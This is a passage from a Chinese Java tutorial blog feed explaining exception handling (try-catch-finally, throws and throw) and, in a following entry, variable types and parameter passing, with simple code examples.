<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>…<span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span>② 声明抛出<span class="token punctuation">[</span>例<span class="token number">5</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> NonRuntimeExceptionDemo1<span class="token punctuation">.</span>java<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NonRuntimeExceptionDemo1</span><span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>      FileInputStream in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> s<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>      in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-3-对于运行时异常和非运行时异常的一些说明"><font color="#20B2AA" face="Comic sans MS">2.3  对于运行时异常和非运行时异常的一些说明</font><a href="post/Java-Exception-Handling7#2-3-对于运行时异常和非运行时异常的一些说明"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. ☕编译器和异常：</strong></font>编译器强制要求程序员捕获或声明抛出非运行时异常<br>   <em>到底为什么要这么做呢？？？</em><br>对于运行时异常，编译器不强制要求，但用户也可以自己去捕获<br>   <em>这个时候会出现什么效果呢？？？</em></font></p><p><font color="red"><strong>2. ☕运行时系统和异常：</strong></font><br>(1) 异常都有抛出的轨迹；<br>(2) 对于所有异常，某个方法产生的异常 ，如果没有被捕获，就会自动抛给方法的调用者（但是对非运行时异常一定要声明抛出），如果调用者还没有捕获，再抛给调用者的调用者，以此类推，直到main方法里发现还没有捕获，那么运行时系统就会来处理这个异常，把异常信息和异常的轨迹信息打印给用户。</p><p><font color="red"><strong>3. ☕两点建议：</strong></font><br>(1) 建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程者希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误；<br>(2) 建议对于非运行时异常，用户应该去捕获，以交代程序员的处理该错误的代码，实在不行，就声明抛出给方法的调用者。</p><p><font color="red"><strong>3. ☕异常类常用的方法：</strong></font><br><font color="#00B2EE"><strong>public Exception()</strong></font><br><font color="#00B2EE"><strong>public Exception(String s)</strong></font>&emsp; :该参数一般表示该异常对应的错误的描述<br><font color="#00B2EE"><strong>public String toString()</strong></font>&emsp;:返回描述当前异常对象信息的字符串<br><font color="#00B2EE"><strong>public String getMessage()</strong></font>&emsp;:返回描述当前异常对象信息的详细信息。<br><font color="#00B2EE"><strong>public void printStackTrace()</strong></font>&emsp;:打印当前异常对象使用堆栈的轨迹。<br></p><div class="article-img"><p><img src="https://i.loli.net/2018/12/29/5c2656f46e0d4.png" alt="5S.png" data-zoomable></p></div><div class="article-img"><p><img src="https://i.loli.net/2018/12/29/5c2656f96a129.png" alt="4DI6.png" data-zoomable></p></div><p>&emsp;<br>&emsp;</p><h3 id="三、-try-catch-finally异常处理"><font color="#FF6347" face="Comic sans MS">三、 try-catch-finally异常处理</font><a href="post/Java-Exception-Handling7#三、-try-catch-finally异常处理"></a></h3><h4 id="3-1-概括try-catch-finally语句"><font color="#20B2AA" face="Comic sans MS">3.1  概括try-catch-finally语句</font><a href="post/Java-Exception-Handling7#3-1-概括try-catch-finally语句"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>用户处理异常的三种方法:</strong></font><br>       (1)用户可以用try-catch-finally语句进行<font color="#00B2EE"><strong>抛出</strong></font>和<font color="#00B2EE"><strong>捕获处理</strong></font>；<br>       (2)如果不想捕获和处理异常，可以通过throws语句<font color="#00B2EE"><strong>声明要抛出的异常</strong></font>；<br>       (3) 用户可以定义自己的异常类,并用throw语句来抛出。</font></p><p>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置。即：<font color="red"><strong>运行时异常：会输出到设备显示哪里存在错误，请更正；非运行时异常：编译报错时提示必须添加非运行时异常处理，比如加try{}…catch(类名 对象){}或者使用throws来抛出异常</strong></font>。<br></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span><span class="token operator">-</span><span class="token keyword">catch</span><span class="token operator">-</span><span class="token keyword">finally</span>语句对程序运行进行监控，捕获和处理异常通常形式： <span class="token keyword">try</span><span class="token punctuation">{</span>调用可能产生异常的方法及其它java语句；<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类名<span class="token number">1</span> 异常对象名e<span class="token punctuation">)</span><span class="token punctuation">{</span>异常处理语句块；<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类名<span class="token number">2</span> 异常对象名e<span class="token punctuation">)</span><span class="token punctuation">{</span>异常处理语句块；<span class="token punctuation">}</span><span class="token keyword">finally</span><span class="token punctuation">{</span>最终处理；<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">5</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>访问文本文件text<span class="token punctuation">.</span>txt，并将其在屏幕上打印出来。<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">TryCatchFinally</span><span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">try</span><span class="token punctuation">{</span>        FileInputStream in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> s<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">catch</span><span class="token punctuation">(</span>FileNotFoundException e<span class="token punctuation">)</span><span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>“捕获异常：”<span class="token operator">+</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//e会调用toString()方法回显异常信息给程序员</span>       <span class="token punctuation">}</span>       <span class="token keyword">catch</span><span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span><span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"捕获异常："</span><span class="token operator">+</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">finally</span><span class="token punctuation">{</span>       System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finally块总是执行！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>运行结果：捕获异常：java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileNotFoundException<span class="token operator">:</span> text<span class="token punctuation">.</span><span class="token function">txt</span> <span class="token punctuation">(</span>系统找不到指定的文件。<span class="token punctuation">)</span><span class="token keyword">finally</span>块总是执行！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="3-2-try语句"><font color="#20B2AA" face="Comic sans MS">3.2  try语句</font><a href="post/Java-Exception-Handling7#3-2-try语句"></a></h4><p><font face="Comic sans MS">☕<font color="red"><strong>try{}</strong></font>：将可能抛出一个或者若干个异常的代码放入try语句块中。<br><font color="red"><strong>注意：</strong></font>应当尽量<strong>减小</strong>try代码块的大小，不要将整个程序代码全部放入try语句块中，而是应当仔细分析代码，在可能出现异常情况的地方用try进行监控。</font></p><p>因为当发生异常时，程序控制由try块转到catch块，Java将跳过try中后面的语句，且永远不会从catch块返回到try块。因此若将整个程序代码都放在try中，若一开始发生异常，则后面的语句将永远不会被执行，从而影响了程序的实现。<br></p><p>&emsp;</p><h4 id="3-3-catch语句"><font color="#20B2AA" face="Comic sans MS">3.3  catch语句</font><a href="post/Java-Exception-Handling7#3-3-catch语句"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**📒(1)** <font color="red">**try语句后面必须跟有一个或多个catch语句来处理try中产生的异常事件**</font>。如果try语句中未产生异常，  那么catch语句将不执行。 **📒(2)catch语句需要一个参数：**<font color="red">**一个异常类名和该异常类的对象。注意该异常类必须是Throwable类的子类**</font>.**📒(3)** try块中发生了一个异常，try-catch语句就会自动在try块后面的各个catch块中，找出与该异常类相        匹配的参数。当参数符合以下3个条件之一时，就认为这个参数与产生的异常相匹配：        （1）参数与产生的异常属于一个类；        （2）参数是产生的异常的父类；        （3）参数是一个接口时，产生的异常实现了这一接口。 <font color="red">**📒(4) 注意：**</font>(1) 当产生的异常找到了第一个与之相匹配的参数时，就执行包含这一参数的catch语句中的Java代码，执行完catch语句后，程序恢复执行，但不会回到异常发生处继续执行，而是执行try-catch结构后面的代码。(2) 可以用一个catch块来处理多个异常类型，此时catch的参数应该是这多个异常的父类。(3) 有多个catch块时，要细心安排catch块的顺序。<font color="red">  **将子类的catch块放在前面，父类的catch块放在后面。**</font></font></td></tr></table></div></div><p>&emsp;</p><h4 id="3-4-finally子句"><font color="#20B2AA" face="Comic sans MS">3.4  finally子句</font><a href="post/Java-Exception-Handling7#3-4-finally子句"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**1.finally语句：**</font> 无论在try块中是否产生异常，也不管产生的异常是否会被捕获，finally中的语句最终都会                           被执行。<font color="red">**2.作用：**</font> 为异常处理事件提供一个清理机制,例如清理打开文件、Socket、JDBC连接之类的资源。<p>  如果程序用到了文件、Socket、JDBC连接之类的资源，即使遇到了异常，也要正确释放占用的资源。<br>&ensp;<strong>finally语句可以说是为异常处理事件提供的一个清理机制. 一般是用来关闭文件或释放其他的系统资源，作<br>  为try-catch-finally结构的一部分，可以没有finally语句，如果存在finally语句，不论try块中是否发生<br>  了异常，是否执行过catch语句，都要执行finally语句。</strong></p><p><font color="red"><strong>3. 带有finally子句的try-catch-finally语句的形式如下：</strong></font></p></font></td></tr></table></div></div>  <p></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span> … <span class="token punctuation">}</span>           <span class="token comment" spellcheck="true">//…是正常执行的代码, 可能产生异常</span>       <span class="token keyword">catch</span> <span class="token punctuation">(</span>异常类<span class="token number">1</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> … <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//…是异常类1的处理代码</span>       <span class="token keyword">catch</span> <span class="token punctuation">(</span>异常类<span class="token number">2</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> … <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//…是异常类1的处理代码</span>        ……      <span class="token keyword">catch</span> <span class="token punctuation">(</span>异常类n e<span class="token punctuation">)</span> <span class="token punctuation">{</span> … <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//…是异常类2的处理代码</span>      <span class="token keyword">finally</span> <span class="token punctuation">{</span> … <span class="token punctuation">}</span>                   <span class="token comment" spellcheck="true">//…是执行清除工作的语句</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**4.执行过程：**</font> **(1) try块中的语句没有产生异常。**在这种情况下，Java首先执行try块中的所有的语句，然后执行finally子句    中的代码，最后执行try…catch..finally块后面的语句；**(2) try块中的语句产生了异常，而且此异常在方法内被捕获(有catch匹配)。** 在这种情况下，Java首先执行try    块中的语句，直到产生异常处，然后跳过此try块中剩下的语句，执行捕获此异常的catch子句的处理代码；    然后执行finally子句中的代码；**(3) 如果在catch子句又重新抛出了异常。**也会执行finally，然后将这个异常抛出给方法的调用者；**(4) try块中产生了异常，而此异常在方法内没有被捕获(没有catch匹配) 。**在这种情况下，Java将执行try块    中的代码直到产生异常，然后跳过try块中的代码而转去执行finally子句中的代码，最后将异常抛出给方法    的调用者。</font></td></tr></table></div></div>  <p>&emsp;<br>&emsp;</p><h3 id="四、-throws-throw抛出异常"><font color="#FF6347" face="Comic sans MS">四、 throws-throw抛出异常</font><a href="post/Java-Exception-Handling7#四、-throws-throw抛出异常"></a></h3><h4 id="4-1-throws抛出异常"><font color="#20B2AA" face="Comic sans MS">4.1  throws抛出异常</font><a href="post/Java-Exception-Handling7#4-1-throws抛出异常"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throws说明：</strong></font><br><strong>在设计可能会抛出异常的方法时，可以有两个选择：</strong><br><font color="#00B2EE"><strong>(1) 使用try-catch-finally处理方法中的异常</strong></font>；<br><font color="#00B2EE"><strong>(2) 声明抛出异常：</strong></font>不捕获异常(<font color="red">没有throws方法的创建异常类的实例和抛出异常。是个空语句。</font>)，而是将异常交由上一层处理，在其他地方捕获异常。如果使用后者，那么应该（在某些情况下）向编译器表明：此方法可能会抛出异常，但方法本身不会捕获它。可以在方法头中用throws子句来实现此功能。</font></p><p>(2.1)带throws异常说明的方法说明形式如下：<br>       <font color="#00B2EE"> …  方法名(…) [throws 异常类列表]<br>        { 方法体  }<br></font><br>&emsp;<br><font color="red"><strong>📒注意：</strong></font><br> （１）方法抛出的异常类是throws子句中指定的异常类或其子类。<br> （２）并不是所有可能发生的异常都要在方法的说明中指定，从Error类中派生出的异常和从RuntimeException类中派生的异常就不用在方法声明中指定。</p><p><font color="red"><strong>📒在下列情况下Java方法可以声明抛出异常：</strong></font><br> （１）调用的方法抛出了异常；<br> （２）检测到了错误并使用throw语句抛出异常；<br> </p><pre class="line-numbers language-java"><code class="language-java">例<span class="token number">1</span>：调用的方法抛出了异常 <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>…… <span class="token keyword">public</span> String <span class="token function">getInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>……    System<span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>例<span class="token number">2</span>：检测到了错误并使用<span class="token keyword">throw</span>语句抛出异常<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>…… <span class="token keyword">public</span> String <span class="token function">getInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>……     IOException ae <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"buffer is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> ae<span class="token punctuation">;</span> <span class="token punctuation">}</span>例<span class="token number">3</span>： <span class="token keyword">throws</span>多个异常<span class="token keyword">class</span> <span class="token class-name">Animation</span><span class="token punctuation">{</span>                                                    <span class="token keyword">public</span> Image <span class="token function">loadImage</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token keyword">throws</span>                   EOFException<span class="token punctuation">,</span> MalformURLException   <span class="token punctuation">{</span>  …… <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="4-2-throw抛出异常"><font color="#20B2AA" face="Comic sans MS">4.2  throw抛出异常</font><a href="post/Java-Exception-Handling7#4-2-throw抛出异常"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throw说明：</strong></font><br><strong>要使用throw，则必须在方法名后面指出throws；但是使用throws，抛出可以是空语句不用写，交给上一层处理！！</strong><br>在捕获一个异常前，必须有一段Java代码来生成和抛出一个异常对象。Java用throw语句抛出异常。throw语句的格式如下：<br>                <font color="red">throw ThrowableObject；<br></font><br>&emsp;<br><font color="#00B2EE"><strong>异常对象的生成和抛出可以有以下三种情况：</strong></font><br>　　　（１）Java运行时系统<br>　　　（２）JDK中某个类<br>　　　（３）在程序中创建异常对象抛出</font></p><p><font color="#00B2EE"><strong>使用throw语句应注意：</strong></font><br>（１）一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句if分支中<br>（２）含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常</p><p><font color="#00B2EE"><strong>抛出异常有这样三步：</strong></font><br>    （1）确定异常类；<br>    （2）创建异常类的实例；<br>    （3）抛出异常。<br></p><pre class="line-numbers language-java"><code class="language-java">举例<span class="token keyword">static</span> String <span class="token function">getInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>  <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">boolean</span> flag <span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>   <span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>       buffer<span class="token punctuation">[</span>counter<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>System<span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>counter<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">)</span> flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      counter<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>counter<span class="token operator">>=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> IOException ae <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"buffer is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">throw</span> ae<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token string">"//IOException ae =new IOException("</span><span class="token string">"buffer is full"</span><span class="token string">");  throw ae;"</span>使用<span class="token keyword">throw</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="五、-正确地使用异常"><font color="#FF6347" face="Comic sans MS">五、 正确地使用异常</font><a href="post/Java-Exception-Handling7#五、-正确地使用异常"></a></h3><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">由于异常使用起来非常方便，以至于在很多情况下可能会滥用异常。但是，使用异常处理会降低程序运行的速度，几点建议：<p><font color="red"><strong>（1） 在可以使用简单的测试就能完成的检查中，不要使用异常来代替它。</strong></font>例如：<br>      if (ins!=null)       //使用ins引用对象<br>       {  …   }</p><p><font color="red"><strong>（2） 不要过细地使用异常。</strong></font>最好不要到处使用异常，更不要在循环体内使用异常处理, 可以将它包裹在循环<br>体外面。<br><font color="red"><strong>（3）不要捕获了一个异常而又不对它做任何的处理。</strong></font><br>   try<br>   {<br>     …… //正常执行的代码<br>   }<br>   catch(Exception e) {  }</p><p><font color="red"><strong>(4) 将异常保留给方法的调用者并非不好的做法。</strong></font><br>     对于有些异常，将其交给方法的调用者去处理是一种更好的处理办法。没有类似这样if(counter&gt;=20){<br>      IOException ae =new IOException(“buffer is full”);<br>      throw ae; }的语句，是个空语句。<br></p></font></td></tr></table></div></div>  <p></p><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java变量及其传递、内部类(4.9-4.10)</title>
      <link href="/post/Java-Variable-InnerClass6/"/>
      <url>/post/Java-Variable-InnerClass6/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br>&emsp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">变量及其传递 & 内部类</font></center><p>&emsp;</p><h3 id="一、-Java变量及其传递"><font color="#FF6347" face="Comic sans MS">一、 Java变量及其传递</font><a href="post/Java-Variable-InnerClass6#一、-Java变量及其传递"></a></h3><h4 id="1-1-基本数据变量与引用型变量"><font color="#20B2AA" face="Comic sans MS">1.1  基本数据变量与引用型变量</font><a href="post/Java-Variable-InnerClass6#1-1-基本数据变量与引用型变量"></a></h4><p><font face="Comic sans MS"><strong>1.  📒Java变量:</strong><br>&emsp;<font color="red"><strong>(1). 基本型变量(8种)</strong></font><br>&emsp;&emsp; <strong>char,byte,short,int,long,float,double,boolean</strong><br>&emsp;<font color="red"><strong>(2). 引用型变量：</strong></font><strong>对象,接口,数组</strong></font>            </p><div class="article-img"><p><img src="https://i.loli.net/2018/12/27/5c24f23dc321f.png" alt="T2.png" data-zoomable><br><img src="https://i.loli.net/2018/12/27/5c24f4379eed2.png" alt="N.png" data-zoomable></p></div><pre class="line-numbers language-bash"><code class="language-bash">举例：    public class MyDate<span class="token punctuation">{</span>    private int day<span class="token operator">=</span>12<span class="token punctuation">;</span>    private int month<span class="token operator">=</span>6<span class="token punctuation">;</span>    private int year<span class="token operator">=</span>1900<span class="token punctuation">;</span>    public MyDate<span class="token punctuation">(</span>int y,int m,int d<span class="token punctuation">)</span><span class="token punctuation">{</span>        year<span class="token operator">=</span>y<span class="token punctuation">;</span>        month<span class="token operator">=</span>m<span class="token punctuation">;</span>        day<span class="token operator">=</span>d<span class="token punctuation">;</span><span class="token punctuation">}</span>          void addYear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>   year++<span class="token punctuation">;</span><span class="token punctuation">}</span>         public void display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    System.out.println<span class="token punctuation">(</span>year+<span class="token string">"-"</span>+month             +<span class="token string">"-"</span>+day<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>       MyDate m,n<span class="token punctuation">;</span>       m<span class="token operator">=</span>new MyDate<span class="token punctuation">(</span>2003,9,22<span class="token punctuation">)</span><span class="token punctuation">;</span>       n<span class="token operator">=</span>m<span class="token punctuation">;</span>     <span class="token string">"//n和m指向同一个地址"</span>       n.addYear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       m.display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       n.display<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       System.out.println<span class="token punctuation">(</span>m.toString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>       System.out.println<span class="token punctuation">(</span>n.toString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>      /*运行结果       2004-9-22       2004-9-22       MyDate@11a698a       MyDate@11a698a      */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-2-成员变量与局部变量"><font color="#20B2AA" face="Comic sans MS">1.2  成员变量与局部变量</font><a href="post/Java-Variable-InnerClass6#1-2-成员变量与局部变量"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**成员变量与局部变量有没有区别?**</font>  成员变量若为static的称为类变量，否则称为成员变量，而局部变量是在方法体内的变量。 (1) 📒从语法形式上看，成员变量是属于类或接口的，而局部变量是在方法中定义的变量或方法的参变量； 成员变量可以被public，private，static等修饰，而局部变量则不能被访问控制符及static修饰；成员 变量及局部变量都可以被final修饰。(2) 📒从变量在内存中的存储方式看，成员变量是对象的一部分，而对象是存在于堆中的，而局部变量是     存在于栈中的。(3) 📒从变量在内存中的存在时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变     量随着方法的调用而产生，随着方法调用结束而自动消失。(4) 📒成员变量如果没有赋初值，则会自动以该类型的默认值（0,false,null等）赋值；而局部变量则不会     自动赋值，必须显示地赋值后才能使用。 </font></td></tr></table></div></div><pre class="line-numbers language-bash"><code class="language-bash">class A<span class="token punctuation">{</span>         int a<span class="token punctuation">;</span>         void m<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            int b<span class="token punctuation">;</span>            System.out.println<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  //合法的，a的值为0            System.out.println<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  //不合法，编译不通过           <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-3-变量的传递"><font color="#20B2AA" face="Comic sans MS">1.3  变量的传递</font><a href="post/Java-Variable-InnerClass6#1-3-变量的传递"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒按值传递:</strong></font>当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变。(传递8种基本型变量)<br><font color="red"><strong>2. 📒按引用传递:</strong></font>当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变。(传递对象,接口,数组)<br><font color="#00B2EE"><em>Java中的参数传递比C++简单,按值传递所有参数,制作所有参数的副本,而不管它们的类型。</em></font><br></font></p><pre class="line-numbers language-bash"><code 